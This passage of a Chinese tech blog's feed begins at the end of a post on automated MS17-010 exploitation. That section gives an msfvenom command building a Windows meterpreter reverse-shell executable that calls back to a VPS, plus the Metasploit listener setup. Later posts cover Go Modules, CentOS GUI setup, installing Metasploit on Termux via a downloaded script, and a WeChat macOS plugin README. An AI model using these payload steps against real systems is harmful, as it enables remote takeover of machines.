</p><p>本地执行<code>ssh -R 80:localhost:4444 root@IP</code>将服务器的80端口转发到本地的4444端口</p><p>生成Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=[VPS IP] LPORT=80 -f exe -o /opt/shell.exe</span><br></pre></td></tr></table></figure><p>在msf上启用监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 0.0.0.0</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      利用MS17-010利用脚本，通过简单修改实现全自动化渗透
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="永恒之蓝" scheme="http://lfoder.github.io/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    
      <category term="MS17-010" scheme="http://lfoder.github.io/tags/MS17-010/"/>
    
  </entry>
  
  <entry>
    <title>Go Modules(go mod) + Goland IDE快速上手</title>
    <link href="http://lfoder.github.io/2019/02/26/Go-Modules-go-mod-Goland-IDE%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
    <id>http://lfoder.github.io/2019/02/26/Go-Modules-go-mod-Goland-IDE快速上手/</id>
    <published>2019-02-25T18:08:42.000Z</published>
    <updated>2019-02-25T18:45:46.289Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Go-Module-概述"><a href="#Go-Module-概述" class="headerlink" title="Go Module 概述"></a>Go Module 概述</h3><p><a href="https://www.baidu.com/s?wd=go modules golang" target="_blank" rel="noopener">请自行百度</a></p><h3 id="Go-mod-命令解释"><a href="#Go-mod-命令解释" class="headerlink" title="Go mod 命令解释"></a>Go mod 命令解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">go help modules</span><br><span class="line"></span><br><span class="line">go mod命令</span><br><span class="line"></span><br><span class="line">download    download modules to local cache (下载依赖的module到本地cache))</span><br><span class="line">edit        edit go.mod from tools or scripts (编辑go.mod文件)</span><br><span class="line">graph       print module requirement graph (打印模块依赖图))</span><br><span class="line">init        initialize new module in current directory (再当前文件夹下初始化一个新的module, 创建go.mod文件))</span><br><span class="line">tidy        add missing and remove unused modules (增加丢失的module，去掉未用的module)</span><br><span class="line">vendor      make vendored copy of dependencies (将依赖复制到vendor下)</span><br><span class="line">verify      verify dependencies have expected content (校验依赖)</span><br><span class="line">why         explain why packages or modules are needed (解释为什么需要依赖)</span><br><span class="line"></span><br><span class="line">初始化mod</span><br><span class="line"></span><br><span class="line">go mod init [module]可以创建一个go.mod，只有一行信息module。</span><br></pre></td></tr></table></figure><h3 id="Go-Module-快速上手"><a href="#Go-Module-快速上手" class="headerlink" title="Go Module 快速上手"></a>Go Module 快速上手</h3><p>首先 如果是老项目想使用 <code>Go Modules</code>  确保Goland中你的项目结构如下：</p><p>其中包含一个 main.go 主文件</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0j81fx0ixj30fw09yaax.jpg" alt=""></p><p>如果创建新项目则在新建时确认如下 (新建时会在项目根目录创建一个 <code>go.mod</code> 文件)</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0j82v331kj31760qsacw.jpg" alt=""></p><p>菜单栏 Goland ➡ Preferences… ➡ Go ➡ GOPATH 如下</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0j855tsebj317m0u079i.jpg" alt=""></p><p>菜单栏 Goland ➡ Preferences… ➡ Go ➡ Dep 如下</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0j85nls6jj317m0u0jvx.jpg" alt=""></p><p>菜单栏 Goland ➡ Preferences… ➡ Go ➡ Go Modules(vgo) 如下</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0j867azuwj317m0u0aex.jpg" alt=""></p><p>打开 Terminal 进入到项目根目录 执行 <code>go mod init [项目名]</code> ，如下：</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0j8vnzgi2j30zf0u0123.jpg" alt="image-20190226022457955"></p><p>此时已经给项目使用了 go modules</p><p>接下来执行 <code>go mod tidy</code></p><p>开始等待安装依赖库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ProxyHunter go mod tidy </span><br><span class="line">go: finding github.com/issue9/term/colors latest</span><br><span class="line">go: finding github.com/gogf/gf/g/crypto/gmd5 latest</span><br><span class="line">go: finding github.com/gogf/gf/g/os/gfile latest</span><br><span class="line">go: finding github.com/gogf/gf/g/encoding/gjson latest</span><br><span class="line">go: finding github.com/gogf/gf/g/os/grpool latest</span><br><span class="line">go: finding github.com/gogf/gf/g/util/gconv latest</span><br><span class="line">go: finding github.com/gogf/gf/g/text/gstr latest</span><br><span class="line">go: finding github.com/gogf/gf/g/util/grand latest</span><br><span class="line">go: finding github.com/gogf/gf/g/container/gmap latest</span><br><span class="line">go: finding github.com/levigross/grequests latest</span><br><span class="line">go: downloading github.com/levigross/grequests v0.0.0-20190130132859-37c80f76a0da</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果速度很慢 ，请看这里：</p><p>设环境变量</p><p>GOPROXY=<a href="http://link.zhihu.com/?target=https%3A//goproxy.io/" target="_blank" rel="noopener">https://goproxy.io</a></p><p>或</p><p>GOPROXY=<a href="http://link.zhihu.com/?target=https%3A//athens.azurefd.net/" target="_blank" rel="noopener">https://athens.azurefd.net</a></p><p>可以让 1.11 引入的 go module 使用这些代理下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOPROXY=<span class="string">"https://athens.azurefd.net"</span> </span><br><span class="line"><span class="built_in">export</span> GO111MODULE=on</span><br></pre></td></tr></table></figure><p><code>GO111MODULE</code>  解释, 当为 <code>on</code> 时则使用 <code>Go Modules</code>  ,go 会忽略 <code>$GOPATH</code> 和 <code>vendor</code> 文件夹,只根据<code>go.mod</code>下载依赖。当为 <code>off</code> 时则不适用新特性 <code>Go Modules</code> 支持，它会查找 <code>vendor</code>目录和 <code>$GOPATH</code> 来查找依赖关系，也就是继续使用“GOPATH模式”。当为 <code>auto</code> 时或未设置时则根据当前项目目录下是否存在 <code>go.mod</code>文件或 <code>$GOPATH/src</code> 之外并且其本身包含go.mod文件时才会使用新特性 <code>Go Modules</code>模式，并且<code>auto</code>为 <code>GO111MODULE</code> 的默认值。</p><p>科普时间:</p><blockquote><p>go.mod文件可以通过require，replace和exclude语句使用的精确软件包集。</p><p>require语句指定的依赖项模块<br>replace语句可以替换依赖项模块<br>exclude语句可以忽略依赖项模块</p><p>执行 go mod download</p><p>可以下载所需要的依赖，但是依赖并不是下载到GOPATH中，而是GOPATH/pkg/mod中，多个项目可以共享缓存的module。</p><p>执行 go clean -modcache 清除缓存</p><p>go mod 新东西偶尔还会出现问题 ,这个命令可以尝试修复,不过执行之前可以考虑备份一下pkg/mod中的包.以防不测.</p></blockquote><p>在国内访问 golang.org/x 的各个包都需要翻墙，<br>你可以在go.mod中使用replace替换成github上对应的库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">replace (</span><br><span class="line">    golang.org/x/crypto v0.0.0-20180820150726-614d502a4dac =&gt; github.com/golang/crypto v0.0.0-20180820150726-614d502a4dac</span><br><span class="line">    golang.org/x/net v0.0.0-20180821023952-922f4815f713 =&gt; github.com/golang/net v0.0.0-20180826012351-8a410e7b638d</span><br><span class="line">    golang.org/x/text v0.3.0 =&gt; github.com/golang/text v0.3.0</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p> go mod 探索中 …</p></blockquote>]]></content>
    
    <summary type="html">
    
      如何巧妙的运用 Goland + Go Modules 开发自己的项目
    
    </summary>
    
      <category term="Golang 笔记" scheme="http://lfoder.github.io/categories/Golang-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Golang" scheme="http://lfoder.github.io/tags/Golang/"/>
    
      <category term="Goland" scheme="http://lfoder.github.io/tags/Goland/"/>
    
      <category term="Go Modules" scheme="http://lfoder.github.io/tags/Go-Modules/"/>
    
      <category term="go mod" scheme="http://lfoder.github.io/tags/go-mod/"/>
    
  </entry>
  
  <entry>
    <title>CentOS安装图形化界面</title>
    <link href="http://lfoder.github.io/2019/01/26/CentOS%E5%AE%89%E8%A3%85%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"/>
    <id>http://lfoder.github.io/2019/01/26/CentOS安装图形化界面/</id>
    <published>2019-01-26T04:13:48.000Z</published>
    <updated>2019-01-26T04:22:05.707Z</updated>
    
    <content type="html"><![CDATA[<h3 id="进入root-操作模式"><a href="#进入root-操作模式" class="headerlink" title="进入root 操作模式"></a>进入root 操作模式</h3><p><img src="https://www.linuxidc.com/upload/2018_04/180422080385831.png" alt=""></p><h3 id="安装-X-窗口系统"><a href="#安装-X-窗口系统" class="headerlink" title="安装 X 窗口系统"></a>安装 X 窗口系统</h3><blockquote><p>注意有引号</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum groupinstall <span class="string">"X Window System"</span> -y</span><br></pre></td></tr></table></figure><h3 id="安装图形化界面-GNOME"><a href="#安装图形化界面-GNOME" class="headerlink" title="安装图形化界面 GNOME"></a>安装图形化界面 GNOME</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum groupinstall <span class="string">"GNOME Desktop"</span> <span class="string">"Graphical Administration Tools"</span> -y</span><br></pre></td></tr></table></figure><p>这时，我们可以通过命令 startx 进入图形界面，第一次进入会比较慢，请耐心等待。（可能需要重启，命令为reboot）</p><h3 id="更新系统的默认运行级别"><a href="#更新系统的默认运行级别" class="headerlink" title="更新系统的默认运行级别"></a>更新系统的默认运行级别</h3><p>经过上面的操作，系统启动默认还是命令行页面的，需要我们进行切换。如果想要使系统启动即为图形化窗口，需要执行下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /lib/systemd/system/runlevel5.target /etc/systemd/system/default.target</span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><ul><li>如果安装完成后，虚拟机无法打开，我们需要调整虚拟机<strong>分配内存大小（注意不是磁盘大小），</strong>1024M基本够用。</li><li>如果安装完成后，虚拟机报错0x0000005c，请关闭虚拟机的<strong>3D加速</strong>功能（取消勾选）</li></ul><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>CentOS 7 选择最小安装后安装 GNOME 桌面环境<br><a href="https://www.yuzhi100.com/article/centos-7-mimimal-install-gnome" target="_blank" rel="noopener">https://www.yuzhi100.com/article/centos-7-mimimal-install-gnome</a></p>]]></content>
    
    <summary type="html">
    
      给CentOS安装图形化界面的简单步骤
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Linux" scheme="http://lfoder.github.io/tags/Linux/"/>
    
      <category term="CentOS" scheme="http://lfoder.github.io/tags/CentOS/"/>
    
      <category term="GUI" scheme="http://lfoder.github.io/tags/GUI/"/>
    
      <category term="图形化" scheme="http://lfoder.github.io/tags/%E5%9B%BE%E5%BD%A2%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Termux神器食用姿势</title>
    <link href="http://lfoder.github.io/2018/11/27/Termux%E7%A5%9E%E5%99%A8%E9%A3%9F%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>http://lfoder.github.io/2018/11/27/Termux神器食用姿势/</id>
    <published>2018-11-27T03:10:40.000Z</published>
    <updated>2019-02-27T08:35:44.647Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><blockquote><p>自行百度</p></blockquote><h3 id="安装MetaSploit"><a href="#安装MetaSploit" class="headerlink" title="安装MetaSploit"></a>安装MetaSploit</h3><p>执行以下命令行自动安装MSF与Postgresql(metasploit-framework会同步到home目录下)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">termux-chroot</span><br><span class="line">curl -L https://Auxilus.github.io/metasploit.sh &gt; metasploit.sh</span><br><span class="line">chmod +x metasploit.sh &amp;&amp; ./metasploit.sh</span><br></pre></td></tr></table></figure><p>在此过程中会提示安装多个软件包，输入y回车即可，请耐心等待！(必须在home目录下执行安装脚本，否则会报错！)</p><p>其中有个地方可能因机型不同会卡在如下等位置 很久，<strong>千万不要中途以为卡住了就直接退出</strong>，稍等片刻即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Setting up ruby-dev (2.5.3) ...</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   136    0   136    0     0    108      0 --:--:--  0:00:01 --:--:--   108</span><br><span class="line">100 27.5M  100 27.5M    0     0  4273k      0  0:00:06  0:00:06 --:--:-- 6217k</span><br><span class="line">Fetching: bundler-1.17.1.gem (100%)</span><br><span class="line">Successfully installed bundler-1.17.1</span><br><span class="line">1 gem installed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...  </span><br><span class="line">Fetching metasploit_payloads-mettle 0.4.2</span><br><span class="line">Installing metasploit-payloads 1.3.53</span><br><span class="line">Fetching mqtt 0.5.0</span><br><span class="line">Installing mqtt 0.5.0</span><br><span class="line">Fetching msgpack 1.2.4</span><br><span class="line">Installing msgpack 1.2.4 with native extensions</span><br><span class="line">Fetching nessus_rest 0.1.6</span><br><span class="line">Installing nessus_rest 0.1.6</span><br><span class="line">Fetching net-ssh 5.0.2</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>配置Postgresql数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.msfdb</span><br><span class="line">initdb ~/.msfdb</span><br></pre></td></tr></table></figure><p>创建存放数据库文件的文件夹并初始化数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl -D ~/.msfdb -l ~/.msfdb/msfdb.log start</span><br><span class="line">pg_ctl -D ~/.msfdb -l ~/.msfdb/msfdb.log stop</span><br></pre></td></tr></table></figure><p>启动和停止Postgresql服务(指定~/.msfdb/msfdb.log为数据库日志文件，主要用于排查BUG)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createuser msf</span><br><span class="line">createdb msfdb</span><br></pre></td></tr></table></figure><p>创建名为msf的数据库用户</p><p>创建名为msfdb的数据库(注意:创建用户和数据库时需要先启动数据库服务)</p><p>启动msf并手动连接数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>启动时会出现一行warning，目前来看并没有影响，有强迫症的同学可以找大佬看看怎么解决(注意:个人测试在32位平台的机器上启动MSF时会报段错误，无法使用！在64位平台的机器上可以正常执行)</p><p>连接数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_connect msf@msfdb</span><br></pre></td></tr></table></figure><p>查看数据库状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_status</span><br></pre></td></tr></table></figure><p>重建数据库缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_rebuild_cache</span><br></pre></td></tr></table></figure><p>若一切正常，在成功连接上数据库后，执行搜索漏洞代码时会立即输出相关信息，否则将会提示没有生成模块数据库缓存，使用缓慢的方式进行搜索，虽然对使用MSF的主要功能没有太大影响，但这样会浪费很多时间在不必要的工作上</p><p>搜索一个模块 试试速度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Termux (Linux on Android) 神器优化全过程 Mark一下 慢慢补充...
    
    </summary>
    
      <category term="linux 笔记" scheme="http://lfoder.github.io/categories/linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Linux" scheme="http://lfoder.github.io/tags/Linux/"/>
    
      <category term="Android" scheme="http://lfoder.github.io/tags/Android/"/>
    
      <category term="Termux" scheme="http://lfoder.github.io/tags/Termux/"/>
    
  </entry>
  
  <entry>
    <title>MacOS上微信多功能小助手</title>
    <link href="http://lfoder.github.io/2018/11/26/MacOS%E4%B8%8A%E5%BE%AE%E4%BF%A1%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%B0%8F%E5%8A%A9%E6%89%8B/"/>
    <id>http://lfoder.github.io/2018/11/26/MacOS上微信多功能小助手/</id>
    <published>2018-11-26T09:29:35.000Z</published>
    <updated>2018-11-26T09:39:25.257Z</updated>
    
    <content type="html"><![CDATA[<p>作者GayHub: <a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS" target="_blank" rel="noopener">https://github.com/TKkk-iOSer/WeChatPlugin-MacOS</a></p><p><img src="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/raw/master/Other/ScreenShots/wechatplugin.png" alt="微信小助手.png"></p><p><img src="https://img.shields.io/badge/platform-macos-lightgrey.svg" alt="platform">  <a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/release-v1.7.3-brightgreen.svg" alt="release"></a>  <img src="https://img.shields.io/badge/support-wechat%202.3.19-blue.svg" alt="support">  <a href="./README_EN.md"><img src="https://img.shields.io/badge/readme-english-yellow.svg" alt="Readme"></a>   <a href="./LICENSE"><img src="https://img.shields.io/github/license/TKkk-iOSer/WeChatPlugin-MacOS.svg" alt="GitHub license"></a></p><h1 id="微信小助手-v1-7-3"><a href="#微信小助手-v1-7-3" class="headerlink" title="微信小助手 v1.7.3"></a>微信小助手 v1.7.3</h1><p> <strong><a href="./README_EN.md">English</a> | 中文</strong></p><p>[ <a href="#功能">功能</a> &bull; <a href="#更新日志">更新日志</a> &bull; <a href="#demo演示">Demo演示</a> &bull; <a href="#使用">使用</a> &bull; <a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/blob/master/Install.md" target="_blank" rel="noopener">安装</a> &bull; <a href="#卸载">卸载</a> &bull; <a href="#todo">TODO</a> ]</p><p>其他插件：<br>[ <a href="https://github.com/TKkk-iOSer/wechat-alfred-workflow" target="_blank" rel="noopener">wechat-alfred-workflow</a> &bull; <a href="https://github.com/TKkk-iOSer/QQPlugin-macOS" target="_blank" rel="noopener">QQ 版本</a> ]</p><hr><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>消息自动回复</li><li>消息防撤回</li><li>远程控制(已支持语音)</li><li>微信多开</li><li>第二次登录免认证</li><li>聊天置底功能(<del>类似置顶</del>)</li><li>微信窗口置顶</li><li>会话多选删除</li><li>自动登录开关</li><li>通知中心快捷回复</li><li>聊天窗口表情包复制 &amp; 存储</li><li>小助手检测更新提醒</li><li>alfred 快捷发送消息 &amp; 打开窗口 (需安装：<a href="https://github.com/TKkk-iOSer/wechat-alfred-workflow" target="_blank" rel="noopener">wechat-alfred-workflow</a>)</li><li>会话一键已读</li><li>一键清除空会话</li><li>支持国际化</li><li>新增一键更新</li><li>新增关于小助手</li><li>去除微信url转链（从此直接打开抖音链接🌝</li><li>史上最强 alfred 扩展🌚</li><li>新增移除会话(不删除聊天记录)</li><li>菜单栏(关于小助手)新增 alfred 开关 </li><li>新增是否使用微信自带浏览器开关</li><li>新增<a href="https://github.com/VDeamoV/WeChatHelper" target="_blank" rel="noopener">LaunchBar 扩展</a></li></ul><p><strong>若无使用 alfred，则不必打开 alfred 开关</strong></p><p>远程控制：</p><ul><li style="list-style: none"><input type="checkbox" checked> 屏幕保护</li><li style="list-style: none"><input type="checkbox" checked> 清空废纸篓</li><li style="list-style: none"><input type="checkbox" checked> 锁屏、休眠、关机、重启</li><li style="list-style: none"><input type="checkbox" checked> 退出QQ、WeChat、Chrome、Safari、所有程序</li><li style="list-style: none"><input type="checkbox" checked> 网易云音乐(播放、暂停、下一首、上一首、喜欢、取消喜欢)</li><li style="list-style: none"><input type="checkbox" checked> 小助手(获取指令、防撤回开关、自动回复开关、免认证登录开关)</li></ul><p><strong>若想使用远程控制网易云音乐，请在“系统偏好设置 ==&gt; 安全性与隐私 ==&gt; 隐私 ==&gt; 辅助功能”中添加微信、脚本编辑器</strong></p><hr><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><ul><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.7.3" target="_blank" rel="noopener">适配2.3.19 &amp; 修复安全漏洞(2018-10-23)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.7.1" target="_blank" rel="noopener">适配2.3.17 &amp; 加强 alfred 搜索(2018-07-24)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.7" target="_blank" rel="noopener">新增好多功能…(2018-05-12)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.6.1" target="_blank" rel="noopener">新增自动回复延迟 &amp; 修改置顶窗口快捷(2018-04-07)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.6" target="_blank" rel="noopener">新增 Alfred 快捷发送消息 &amp; 打开聊天窗口(2018-03-18)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.5.1" target="_blank" rel="noopener">新增语音远程控制mac &amp; 优化撤回消息、快捷回复(2018-03-03)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.5.0" target="_blank" rel="noopener">新增小助手检测更新&amp;表情包复制存储等等 (2018-02-24)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.4.0" target="_blank" rel="noopener">新增窗口置顶&amp;多选删除等等 (2017-10-11)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.3.0" target="_blank" rel="noopener">新增置底&amp;免认证 (2017-09-17)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.2.0" target="_blank" rel="noopener">修复聊天记录消失的bug (2017-09-11)</a></p></li><li><p><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/releases/tag/v1.1.0" target="_blank" rel="noopener">重构自动回复，实现多回复 (2017-08-23)</a></p></li></ul><p><strong>详细内容请查看</strong><a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/blob/master/CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a></p><hr><h2 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h2><ul><li><p>消息防撤回<br><img src="http://upload-images.jianshu.io/upload_images/965383-30cbea645661e627.gif?imageMogr2/auto-orient/strip" alt="消息防撤回.gif"></p></li><li><p>自动回复<br><img src="http://upload-images.jianshu.io/upload_images/965383-d488dce3696ba1b3.gif?imageMogr2/auto-orient/strip" alt="自动回复.gif"></p></li><li><p>微信多开<br><img src="http://upload-images.jianshu.io/upload_images/965383-51d8eae02d48fda9.gif?imageMogr2/auto-orient/strip" alt="微信多开.gif"></p></li><li><p>远程控制 (测试关闭Chrome、QQ、开启屏幕保护)<br><img src="http://upload-images.jianshu.io/upload_images/965383-0cf50d9b22b02f2f.gif?imageMogr2/auto-orient/strip" alt="远程控制.gif"></p></li><li><p>免认证 &amp; 置底 &amp; 多选删除<br><img src="http://upload-images.jianshu.io/upload_images/965383-170592b03781cbf4.gif?imageMogr2/auto-orient/strip" alt="免认证&amp;置底&amp;多选删除"></p></li><li><p>通知中心快捷回复<br><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/notification_quick_reply.gif" alt="快捷回复"></p></li><li><p>聊天窗口表情复制 &amp; 存储<br><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/emotion_copy_export.png" height="400" hspace="50"></p></li><li><p>语音远程控制 mac<br><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/voice_remote_control.gif" alt="语音远程控制"></p></li><li><p>Alfred 快速搜索 <a href="https://github.com/TKkk-iOSer/wechat-alfred-workflow" target="_blank" rel="noopener">wechat-alfred-workflow</a><br><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/alfred_search.gif" alt="alfred"></p></li><li><p>Alfred 搜索最近聊天列表 &amp; 查看聊天记录<br><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/alfred_chat_log.gif" alt="alfred"></p></li><li><p>一键已读 &amp; 一键清除空回话<br><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/session_empty_and_clean.gif" alt="基本操作"></p></li></ul><hr><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul><li>消息防撤回：点击<code>开启消息防撤回</code>或者快捷键<code>command + t</code>,即可开启、关闭。</li><li>自动回复：点击<code>开启自动回复</code>或者快捷键<code>conmand + k</code>，将弹出自动回复设置的窗口，点击红色箭头的按钮设置开关。</li></ul><blockquote><p>若关键字为 <code>*</code>，则任何信息都回复；<br>若关键字为<code>x|y</code>,则 x 和 y 都回复；<br>若关键字<strong>或者</strong>自动回复为空，则不开启该条自动回复；<br>可设置延迟回复，单位：秒；<br>若开启正则，请确认正则表达式书写正确，<a href="http://tool.oschina.net/regex/" target="_blank" rel="noopener">在线正则表达式测试</a><br><strong>若开启特定联系人回复，则原先的群聊&amp;私聊回复无效</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/auto_reply.png" alt="自动回复设置.png"></p><ul><li><p>微信多开：点击<code>登录新微信</code>或者快捷键<code>command + shift + n</code>,即可多开微信。</p></li><li><p>远程控制：点击<code>远程控制 Mac OS</code>或者快捷键<code>command + shift + c</code>,即可打开控制窗口。</p></li></ul><p><strong>注意：仅向自己账号发送指令有效</strong></p><p><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/remote_control.png" alt="远程控制设置.png"></p><ul><li>Alfred 使用：请查看 <a href="https://github.com/TKkk-iOSer/wechat-alfred-workflow" target="_blank" rel="noopener">wechat-alfred-workflow</a></li></ul><hr><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>详细安装方法(或者需要重新编译)请查阅 <a href="https://github.com/TKkk-iOSer/WeChatPlugin-MacOS/blob/master/Install.md" target="_blank" rel="noopener">Install.md</a></p><h4 id="1-懒癌版安装"><a href="#1-懒癌版安装" class="headerlink" title="1. 懒癌版安装"></a>1. 懒癌版安装</h4><h5 